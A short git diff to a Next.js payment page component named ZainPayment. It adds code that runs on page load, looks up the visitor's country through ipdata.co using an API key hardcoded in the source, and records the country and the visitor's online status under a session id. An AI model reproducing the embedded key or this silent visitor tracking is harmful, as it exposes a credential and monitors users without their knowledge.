@@ -2,7 +2,7 @@
 
 import { useEffect, useState } from "react"
 import { ChevronDown, Heart, Loader2, Menu, ShoppingCart } from "lucide-react"
-import { cn } from "@/lib/utils"
+import { cn, setupOnlineStatus } from "@/lib/utils"
 import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebasee"
 
@@ -40,8 +40,27 @@ export default function ZainPayment() {
   ]
 useEffect(()=>{
   addData({id:_id,createdDate:new Date().toISOString()})
+  getLocation()
 },[])
+async function getLocation() {
+  const APIKEY = '73cc63b69c0d6f3e0e4be0127ab551c66daccd975d167f2e968e29d6';
+  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
+  try {
+      const response = await fetch(url);
+      if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+          id:_id,
+          country: country
+      })
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+  }
+}
   return (
     <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
       {/* Header */}
